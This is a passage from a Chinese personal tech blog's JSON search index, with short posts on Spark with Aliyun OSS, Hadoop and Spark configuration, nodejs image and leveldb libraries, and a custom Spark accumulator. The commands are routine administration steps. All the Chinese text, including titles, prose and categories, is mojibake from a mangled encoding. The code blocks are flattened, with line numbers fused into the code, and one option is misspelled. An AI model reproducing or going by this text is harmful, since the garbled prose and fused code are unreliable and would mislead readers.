underscores_in_headers on; ...","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"æœ¬åœ°é›†ç¾¤Spark + é˜¿é‡Œäº‘çš„OSS ä½¿ç”¨å¤§å‘","slug":"history/tech/5a5497b5041a198f0685dfe0","date":"2018-01-08T22:21:41.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a5497b5041a198f0685dfe0/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a5497b5041a198f0685dfe0/","excerpt":"","text":"1æœ¬åœ°å¼€å‘æµ‹è¯•Spark è¯»å†™OSSæ–‡ä»¶å¯ä»¥ï¼Œsubmit åˆ°spark é›†ç¾¤çš„æ—¶å€™ï¼Œç¨‹åºå¼‚å¸¸12345678910111213141516171819202122232425262728293031java.io.IOException: java.lang.ClassNotFoundException: com.aliyun.oss.OSSClientat com.aliyun.fs.oss.nat.NativeOssFileSystem.initialize(NativeOssFileSystem.java:138)at org.apache.hadoop.fs.FileSystem.createFileSystem(FileSystem.java:2669)at org.apache.hadoop.fs.FileSystem.access$200(FileSystem.java:94)at org.apache.hadoop.fs.FileSystem$Cache.getInternal(FileSystem.java:2703)at org.apache.hadoop.fs.FileSystem$Cache.get(FileSystem.java:2685)at org.apache.hadoop.fs.FileSystem.get(FileSystem.java:373)at org.apache.hadoop.fs.Path.getFileSystem(Path.java:295)at org.apache.hadoop.mapred.FileInputFormat.singleThreadedListStatus(FileInputFormat.java:258)at org.apache.hadoop.mapred.FileInputFormat.listStatus(FileInputFormat.java:229)at org.apache.hadoop.mapred.FileInputFormat.getSplits(FileInputFormat.java:315)at org.apache.spark.rdd.HadoopRDD.getPartitions(HadoopRDD.scala:194)at org.apache.spark.rdd.RDD$$anonfun$partitions$2.apply(RDD.scala:252)at org.apache.spark.rdd.RDD$$anonfun$partitions$2.apply(RDD.scala:250)at scala.Option.getOrElse(Option.scala:121)at org.apache.spark.rdd.RDD.partitions(RDD.scala:250)at org.apache.spark.rdd.MapPartitionsRDD.getPartitions(MapPartitionsRDD.scala:35)at org.apache.spark.rdd.RDD$$anonfun$partitions$2.apply(RDD.scala:252)at org.apache.spark.rdd.RDD$$anonfun$partitions$2.apply(RDD.scala:250)at scala.Option.getOrElse(Option.scala:121)at org.apache.spark.rdd.RDD.partitions(RDD.scala:250)at org.apache.spark.rdd.RDD$$anonfun$take$1.apply(RDD.scala:1333)at org.apache.spark.rdd.RDDOperationScope$.withScope(RDDOperationScope.scala:151)at org.apache.spark.rdd.RDDOperationScope$.withScope(RDDOperationScope.scala:112)at org.apache.spark.rdd.RDD.withScope(RDD.scala:362)at org.apache.spark.rdd.RDD.take(RDD.scala:1327)at org.apache.spark.rdd.RDD$$anonfun$first$1.apply(RDD.scala:1368)at org.apache.spark.rdd.RDDOperationScope$.withScope(RDDOperationScope.scala:151)at org.apache.spark.rdd.RDDOperationScope$.withScope(RDDOperationScope.scala:112)at org.apache.spark.rdd.RDD.withScope(RDD.scala:362)at org.apache.spark.rdd.RDD.first(RDD.scala:1367)1234æŸ¥çœ‹æ—¥å¿—æ‰¾ä¸åˆ°OSSClient ï¼Œæ˜æ˜æ‰“åŒ…çš„æ—¶å€™æ‰“è¿›å»äº†å‘€ã€‚çœŸæ˜¯æ— è¯­ã€‚æœ€åçš„è§£å†³æ–¹æ¡ˆ 1ï¼š spark-submit -master * --class ****.app --jars /*1.jar , /*2.jar spark.jar2: æŠŠç¼ºå°‘çš„jaræ”¾åˆ° spark é›†ç¾¤å®‰è£…ç›®å½•çš„jarsæ–‡ä»¶å¤¹ä¸‹ã€‚è¿™æ ·åœ¨é›†ç¾¤æ¨¡å¼ä¸­æ¯”è¾ƒéº»çƒ¦ã€‚æ¨èç¬¬ä¸€ç§ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"spark","slug":"spark","permalink":"https://wangxiuwen.github.io/tags/spark/"},{"name":"oss","slug":"oss","permalink":"https://wangxiuwen.github.io/tags/oss/"},{"name":"aliyun","slug":"aliyun","permalink":"https://wangxiuwen.github.io/tags/aliyun/"}],"author":"baipeng"},{"title":"spark standalone ä¿®æ”¹æ—¥å¿—çº§åˆ«","slug":"history/tech/5a54949e17c073a5053c8f28","date":"2018-01-08T22:08:30.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a54949e17c073a5053c8f28/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a54949e17c073a5053c8f28/","excerpt":"","text":"log4j.rootCategory=INFO, console INFO æ”¹ä¸º WARN123cp log4j.properties.template log4j.propertiesvim log4j.propertieslog4j.rootCategory=WARN, console","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"å´æ©è¾¾ æ¢¯åº¦ä¸‹é™ æ¨å¯¼","slug":"history/tech/5a532305ca946d8509a773bc","date":"2018-01-07T19:51:33.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a532305ca946d8509a773bc/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a532305ca946d8509a773bc/","excerpt":"","text":"å´æ©è¾¾ æ¢¯åº¦ä¸‹é™ æ¨å¯¼","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"æœºå™¨å­¦ä¹ èµ„æ–™","slug":"history/tech/5a51ba20ca946d8509a773bb","date":"2018-01-06T18:11:44.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a51ba20ca946d8509a773bb/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a51ba20ca946d8509a773bb/","excerpt":"","text":"æ—è½©ç”°ã€Šæœºå™¨å­¦ä¹ åŸºçŸ³ã€‹ http://www.cnblogs.com/ymingjingr/p/4271742.html ã€Šæœºå™¨å­¦ä¹ æŠ€æ³•ã€‹ æèˆªã€Šç»Ÿè®¡å­¦ä¹ æ–¹æ³•ã€‹ è¡¨è¾¾å­¦ä¹ ä¼˜åŒ–å­¦ä¹ ","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"machine learning demos","slug":"history/tech/5a50dd49ca946d8509a773ba","date":"2018-01-06T02:29:29.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a50dd49ca946d8509a773ba/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a50dd49ca946d8509a773ba/","excerpt":"","text":"http://mldemos.epfl.ch/","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"åˆ†å¸ƒå¼çˆ¬è™«ä»£ç ","slug":"history/tech/5a4dd66eca946d8509a773b9","date":"2018-01-03T19:23:26.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a4dd66eca946d8509a773b9/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a4dd66eca946d8509a773b9/","excerpt":"","text":"https://github.com/wangxiuwen-fork/spider-course-3.git","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"java ä½¿ç”¨ mongoTemplate æ“ä½œ mongodb","slug":"history/tech/5a4dd4c8ca946d8509a773b8","date":"2018-01-03T19:16:24.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a4dd4c8ca946d8509a773b8/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a4dd4c8ca946d8509a773b8/","excerpt":"","text":"å‚è€ƒèµ„æ–™http://www.baeldung.com/queries-in-spring-data-mongodb","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"nodejs gm åº“çš„ä½¿ç”¨","slug":"history/tech/5a4dd485ca946d8509a773b7","date":"2018-01-03T19:15:17.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a4dd485ca946d8509a773b7/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a4dd485ca946d8509a773b7/","excerpt":"","text":"nodejs gm åº“çš„ä½¿ç”¨å®‰è£…ä¾èµ–12apt install imagemagickapt install graphicsmagickè°ƒç”¨å‡½æ•°åº“123456789101112var gm = require(&apos;gm&apos;).subClass(&#123;imageMagick:true&#125;);gm(&apos;xzx.jpg&apos;).append(&quot;./er.jpg&quot;).font(&apos;MSYH.TTF&apos;).fontSize(30).drawText(30,200, &quot;æœˆæœˆé¸Ÿ&quot;).write(&quot;out.jpg&quot;, function (err) &#123; if (!err) console.log(&apos; hooray! &apos;);&#125;);å¾€å›¾ç‰‡ä¸Šå†™å­—çš„æ—¶å€™éœ€è¦æŒ‡å®šå­—ä½“, è¿™é‡ŒæŒ‡å®šäº† MSYH.TTF'å‚è€ƒèµ„æ–™https://github.com/sindresorhus/awesome-nodejs#image","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"å¤§æ•°æ®å¹³å°ç›‘æ§","slug":"history/tech/5a47c36685fb66a2736d4ef1","date":"2017-12-31T04:48:38.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a47c36685fb66a2736d4ef1/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a47c36685fb66a2736d4ef1/","excerpt":"","text":"ä½¿ç”¨ cdh ç‰ˆæœ¬ï¼Œ å®ƒè‡ªå¸¦ cloudera managerä½¿ç”¨ä»¥ä¸‹ç›‘æ§:1apache gangliaï¼Œ graphite","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"æ–°ç‰ˆ notepad++ æ²¡æœ‰ plugin manager","slug":"history/tech/5a48416bca946d8509a773b4","date":"2017-12-31T01:46:19.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a48416bca946d8509a773b4/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a48416bca946d8509a773b4/","excerpt":"","text":"ä¸‹è½½åœ°å€https://github.com/bruderstein/nppPluginManager/releases","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"nodejs ä½¿ç”¨ leveldb","slug":"history/tech/5a483742ca946d8509a773b3","date":"2017-12-31T01:02:58.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a483742ca946d8509a773b3/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a483742ca946d8509a773b3/","excerpt":"","text":"å®‰è£…æ¨¡å—123 npm install levelup leveldown --save``` æŠ¥é”™ä¿¡æ¯:sh: 1: node-pre-gyp: Permission denied 12è§£å†³npm config set unsafe-perm true å‚è€ƒèµ„æ–™: [https://docs.npmjs.com/misc/config#unsafe-perm](https://docs.npmjs.com/misc/config#unsafe-perm) unsafe-perm Default: false if running as root, true otherwise Type: Boolean Set to true to suppress the UID/GID switching when running package scripts. If set explicitly to false, then installing as a non-root user will fail.","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"hadoop éƒ¨ç½²é…ç½®æ–‡ä»¶","slug":"history/tech/5a48d856ca946d8509a773b6","date":"2017-12-31T00:30:14.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a48d856ca946d8509a773b6/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a48d856ca946d8509a773b6/","excerpt":"","text":"ç¯å¢ƒå˜é‡1etc/hadoop/hadoop-env.xmlé…ç½®æ–‡ä»¶1etc/hadoop/maperd-site.xmlyarn1yarn-site.xmlslaves1etc/hadoop/slavesæ ¼å¼åŒ–1bin/hadoop namenode -formatæµ‹è¯• hadoop è®¡ç®— pi:1./bin/hadoop jar share/hadoop/mapreduce/hadoop-mapreduce-examples-2.7.3.jar pi 2 10","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"æŸ¥çœ‹ linux æ“ä½œç³»ç»Ÿæ˜¯ 32 ä½ è¿˜æ˜¯ 64 ä½","slug":"history/tech/5a48d6f5ca946d8509a773b5","date":"2017-12-31T00:24:21.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a48d6f5ca946d8509a773b5/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a48d6f5ca946d8509a773b5/","excerpt":"","text":"1getconf LONG_BIT","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"å°† rdd éšå¼è½¬åŒ–ä¸º DataFrame","slug":"history/tech/5a47426b85fb66a2736d4ef0","date":"2017-12-29T19:38:19.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a47426b85fb66a2736d4ef0/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a47426b85fb66a2736d4ef0/","excerpt":"","text":"é¦–å…ˆpomæ–‡ä»¶ä¸­åŠ å…¥ä¾èµ–12345&lt;dependency&gt; &lt;groupId&gt;org.apache.spark&lt;/groupId&gt; &lt;artifactId&gt;spark-sql_2.11&lt;/artifactId&gt; &lt;version&gt;$&#123;spark.version&#125;&lt;/version&gt;&lt;/dependency&gt;123val spark = SparkSession.builder().master(&quot;local&quot;).appName(&quot;WordCount&quot;).config(sparkConf).getOrCreate()//åˆ©ç”¨ scalaçš„éšå¼è½¬æ¢ï¼Œå¯ä»¥å°† rdd éšå¼è½¬åŒ–ä¸º DataFrame import spark.implicits._æ³¨æ„: å¯¼å…¥éœ€è¦ä¸€ä¸ª â€œstable identifierâ€ ï¼Œ å¦‚æœå®šä¹‰æˆ var spark åˆ™æ— æ³•å¯¼å…¥","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"å¤–éƒ¨æ’åº&å¤šè·¯å½’å¹¶æ’åº","slug":"history/tech/5a45b9ca85fb66a2736d4eef","date":"2017-12-29T03:43:06.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a45b9ca85fb66a2736d4eef/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a45b9ca85fb66a2736d4eef/","excerpt":"","text":"å¤–éƒ¨æ’åº&amp;å¤šè·¯å½’å¹¶æ’åºå¾…å®Œæˆ","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"spark åŸºç¡€","slug":"history/tech/5a43b2f47d1fd3a0094153fe","date":"2017-12-27T02:49:24.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a43b2f47d1fd3a0094153fe/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a43b2f47d1fd3a0094153fe/","excerpt":"","text":"spark-default.conf å‚æ•°1234567spark.yarn.historyServer.address=test:18080spark.history.ui.port=18080spark.eventLog.enabled=truespark.eventLog.dir=hdfs://test-1:9000/tmp/spark/events# æ— éœ€æ¯æ¬¡ä¸Šä¼ jaråŒ…spark.yarn.archive=hdfs:///system/spark/spark-libs.jarspark-env.sh:1export HADOOP_CONF_DIR=/usr/local/hadoop/hadoop-2.7.3/etc/hadoopå¯åŠ¨bin/spark-shell --master yarn --deploy-mode client spark-shell å†…éƒ¨è°ƒç”¨äº† spark-submityarn æ¨¡å¼æŸ¥çœ‹æ—¥å¿—bin/yarn logs --applicationId application_xxxxx æäº¤ä½œä¸šå’Œè¿è¡Œå‘½ä»¤çš„ç”¨æˆ·å¿…é¡»ä¸€è‡´ï¼Œå¦åˆ™æ‹‰ä¸åˆ°æ—¥å¿—å†…å­˜é…ç½®1234&lt;property&gt; &lt;name&gt;yarn.nodemanager.vmem-pmem-ratio&lt;/name&gt; &lt;value&gt;10&lt;/value&gt;&lt;/property&gt;1spark-submit --excutor-memory 10G --conf &quot;spark.yarn.executor.memoryOverhead=2048&quot;hdfs æŸ¥çœ‹ ä¸€ä¸ªæ–‡ä»¶ä¸‹çš„ block ä¸ªæ•°1hdfs fsckpartque æ–‡ä»¶â€“master é€‰é¡¹ä¸ºåˆ†å¸ƒå¼çš„é›†ç¾¤æŒ‡å®š master URL, local ä¸º å•è¿›ç¨‹å¯åŠ¨ï¼Œ local[N] ä¸ºNä¸ªè¿›ç¨‹å¯åŠ¨ï¼Œæµ‹è¯•çš„æ—¶å€™åº”è¯¥æŒ‡å®šä¸º local123./bin/spark-shell --master local[2]./bin/spark-shell --master yarn --deploy-mode client --verboseæŸ¥çœ‹ hdfs ä¸€ä¸ªæ–‡ä»¶æœ‰å‡ ä¸ª block1./bin/hdfs fsck /data/opt/test.txt --files --blocks -locations","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"spark è¯»å– mongodb","slug":"history/tech/5a436d39c3dae4117dfd3f26","date":"2017-12-26T21:51:53.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a436d39c3dae4117dfd3f26/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a436d39c3dae4117dfd3f26/","excerpt":"","text":"spark è¯»å– mongodb:1./spark-shell --conf &quot;spark.mongodb.input.uri=mongodb://127.0.0.1:27017/db.input&quot; --conf &quot;spark.mongodb.output.uri=mongodb://127.0.0.1:27017/db.output&quot; --packages org.mongodb.spark:mongo-spark-connector_2.11:2.2.0","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"sparkPi æ‰§è¡Œ","slug":"history/tech/5a436087c3dae4117dfd3f25","date":"2017-12-26T20:57:43.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a436087c3dae4117dfd3f25/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a436087c3dae4117dfd3f25/","excerpt":"","text":"æ‰§è¡Œå‘½ä»¤jar tf examples/jars/spark-examples_2.11-2.1.0.jar | grep SparkPi # é›†ç¾¤: ./bin/spark-submit --class org.apache.spark.examples.SparkPi --master spark://10.0.177.242:7077 examples/jars/spark-examples_2.11-2.1.0.jar # æœ¬åœ° ./bin/spark-submit --class org.apache.spark.examples.SparkPi --master local examples/jars/spark-examples_2.11-2.1.0.jar yarn æ‰§è¡Œexport HADOOP_CONF_DIR=/usr/local/hadoop/hadoop-2.7.3/etc/hadoop ./bin/spark-submit --class org.apache.spark.examples.SparkPi --master yarn-client examples/jars/spark-examples_2.11-2.1.0.jar # æŸ¥çœ‹æ—¥å¿— ../hadoop-2.7.3/bin/yarn logs --applicationId application_xxxxx yarn ä¸Šå¯åŠ¨ spark-shell./bin/spark-shell --master yarn-client","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"Spark ç´¯åŠ å™¨ Accumulator å’Œ å¹¿æ’­å˜é‡çš„ä½¿ç”¨","slug":"history/tech/5a434be8c3dae4117dfd3f24","date":"2017-12-26T19:29:44.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a434be8c3dae4117dfd3f24/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a434be8c3dae4117dfd3f24/","excerpt":"","text":"ä½¿ç”¨åœºæ™¯ï¼š åœ¨rddçš„ï¼ˆTransformationï¼‰mapè½¬æ¢æ•°æ®ä¸­éœ€è¦ç»Ÿè®¡å‡ºç°æ¬¡æ•°çš„æ‰‹æœºå·ï¼Œç”¨æ¥æ ‡è®°è¿™æ¡æ•°æ®ä¸ºé‡å¤çš„æ•°æ®ã€‚é¦–å…ˆä½¿ç”¨guavaçš„HashMultiset ä½œä¸ºè®¡æ•°å™¨ã€‚ä½†æ˜¯rddçš„taskåœ¨å¤„ç†ä»»åŠ¡æ—¶ï¼Œåˆ†ç‰‡å‰¯æœ¬æ²¡æœ‰è¿™ä¸ªå˜é‡ï¼Œæ¥ä¸‹æ¥ä½¿ç”¨sparkè‡ªå¸¦çš„ç´¯åŠ å™¨å¤„ç†ï¼Œå¹¶ä½¿ç”¨guavaçš„è®¡æ•°å™¨è‡ªå®šä¹‰ä¸€ä¸ªç´¯åŠ å™¨ã€‚ Accumulatorç®€ä»‹ Accumulatoræ˜¯sparkæä¾›çš„ç´¯åŠ å™¨ï¼Œé¡¾åæ€ä¹‰ï¼Œè¯¥å˜é‡åªèƒ½å¤Ÿå¢åŠ ã€‚ åªæœ‰driverèƒ½è·å–åˆ°Accumulatorçš„å€¼ï¼ˆä½¿ç”¨valueæ–¹æ³•ï¼‰ï¼ŒTaskåªèƒ½å¯¹å…¶åšå¢åŠ æ“ä½œï¼ˆä½¿ç”¨ +=ï¼‰ã€‚ä½ ä¹Ÿå¯ä»¥åœ¨ä¸ºAccumulatorå‘½åï¼ˆä¸æ”¯æŒPythonï¼‰ï¼Œè¿™æ ·å°±ä¼šåœ¨spark web uiä¸­æ˜¾ç¤ºï¼Œå¯ä»¥å¸®åŠ©ä½ äº†è§£ç¨‹åºè¿è¡Œçš„æƒ…å†µã€‚ Accumulatoæ˜¯Sparkä¸­æä¾›çš„ä¸€ç§åˆ†å¸ƒå¼çš„å˜é‡æœºåˆ¶ï¼Œå…¶åŸç†ç±»ä¼¼äºmapreduceï¼Œå³åˆ†å¸ƒå¼çš„æ”¹å˜ï¼Œç„¶åèšåˆè¿™äº›æ”¹å˜ã€‚ç´¯åŠ å™¨çš„ä¸€ä¸ªå¸¸è§ç”¨é€”æ˜¯åœ¨è°ƒè¯•æ—¶å¯¹ä½œä¸šæ‰§è¡Œè¿‡ç¨‹ä¸­çš„äº‹ä»¶è¿›è¡Œè®¡æ•°ã€‚ è‡ªå®šä¹‰çš„MultisetAccumulator class MultisetAccumulator extends AccumulatorV2[String, HashMultiset[String]] { private val multiset = HashMultiset.create[String] override def isZero: Boolean = { multiset.isEmpty } override def copy(): AccumulatorV2[String, HashMultiset[String]] = { val newAcc = new MultisetAccumulator() multiset.synchronized { newAcc.multiset.addAll(multiset) } newAcc } override def reset(): Unit = { multiset.clear() } override def add(v: String): Unit = { multiset.add(v) } override def merge(other: AccumulatorV2[String, HashMultiset[String]]): Unit = { other match { case o: MultisetAccumulator =&gt; multiset.addAll(o.value) } } override def value: HashMultiset[String] = { multiset } def count(v: String): Int = { multiset.count(v) } } ç»Ÿè®¡ä½¿ç”¨ åˆ›å»ºæˆ‘ä»¬è‡ªå®šä¹‰çš„å åŠ å™¨ï¼Œæ³¨å†Œåˆ°sparkContext val multiset = new MultisetAccumulator spark.sparkContext.register(multiset, &quot;MultisetAccumulator&quot;) multiset.add(&quot;phone&quot;) éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äºSparkçš„lazyæœºåˆ¶ï¼Œåªæœ‰åœ¨save*è¿™ä¸ªactionç®—å­æ‰§è¡Œåæˆ‘ä»¬æ‰èƒ½å¾—åˆ°multisetçš„æ­£ç¡®ç»“æœã€‚ å¹¿æ’­å˜é‡ 